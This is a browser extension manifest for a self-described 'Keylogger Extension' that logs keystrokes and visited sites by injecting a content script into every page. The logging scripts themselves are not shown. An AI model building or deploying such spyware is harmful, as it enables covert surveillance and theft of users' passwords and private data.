{
  "manifest_version": 3,
  "name": "Keylogger Extension",
  "description": "This extension logs keystrokes and visited sites.",
  "version": "1.0",
  "background": {
    "service_worker": "background.js"
  },
  "permissions": [
    "activeTab"
  ],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"]
    }
  ]
}
